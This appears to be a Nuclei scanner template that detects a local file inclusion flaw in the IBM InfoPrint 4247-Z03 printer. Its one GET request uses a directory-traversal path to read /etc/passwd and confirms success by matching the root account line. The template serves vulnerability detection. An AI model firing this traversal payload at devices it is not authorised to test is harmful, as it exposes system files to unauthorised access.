id: ibm-infoprint-lfi

info:
  name: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion
  author: harshbothra_
  severity: high
  description: IBM InfoPrint 4247-Z03 Impact Matrix Printer is subject to local file inclusion.
  reference:
    - https://www.exploit-db.com/exploits/47835
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: matrix,printer,edb,ibm,lfi,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
